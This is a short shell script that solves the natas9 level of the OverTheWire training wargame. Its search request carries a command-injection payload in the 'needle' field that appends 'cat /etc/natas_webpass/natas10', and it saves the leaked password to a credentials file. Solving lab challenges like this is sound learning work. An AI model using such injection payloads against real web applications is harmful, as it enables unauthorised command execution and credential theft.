#!/bin/sh

level="natas9"
url="http://$level.natas.labs.overthewire.org"
web_auth=$(grep ^$level credentials)

echo -n "[i] Target: $url\n"
next_password=$(curl -u $web_auth -sL "$url/?needle=%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10&submit=Search" | grep "<pre>" -a1 | grep -vE "<pre>|Output")
echo -n "[+] Password for the next level: $next_password"
echo "natas10:$next_password" >> ./credentials
